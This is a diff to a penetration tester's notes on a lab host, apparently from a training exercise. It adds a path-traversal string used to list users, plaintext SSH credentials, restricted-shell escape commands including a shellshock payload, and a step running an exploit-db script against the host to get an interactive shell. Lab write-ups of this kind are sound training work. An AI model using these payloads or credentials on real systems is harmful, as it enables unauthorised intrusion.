@@ -50,10 +50,25 @@ user: ../../../../../../../../etc/bash_completion.d
 user: ryuu
 user: joe45
 
+# SSH
+
 ## credentials
 username: ryuu
 password: QUHqhUPRKXMo4m7k
 
+## rhost exploits
+https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf
+might be interesting:
+* `ssh username@IP -t "() { :; }; /bin/bash" (shellshock)`
+* `ssh username@IP -t "bash --noprofile"`
+
+# Marcus creds: 
+/home/marcus
+
+## James server
+
+` python 35513.py 10.11.1.72` adjust payload to establish interactive shell
+ fix path with: `export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin` to have ls
 
 # Evidence
 * connect to ssh with `ssh ryuu@10.11.1.72` => we get rbash which is a restricted shell
